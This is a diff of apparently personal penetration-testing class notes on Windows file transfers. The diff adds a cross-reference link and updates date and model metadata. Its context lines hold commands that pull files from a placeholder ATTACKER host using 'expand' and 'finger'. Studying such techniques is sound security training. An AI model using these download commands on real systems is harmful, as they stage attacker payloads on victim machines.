@@ -142,8 +142,11 @@ expand http://ATTACKER/tool.cab C:\Temp\tool.exe
 finger user@ATTACKER | more +2 > C:\Temp\out.txt
 ```
 
+
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2).
+
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-31*
+*Model: claude-opus-5*
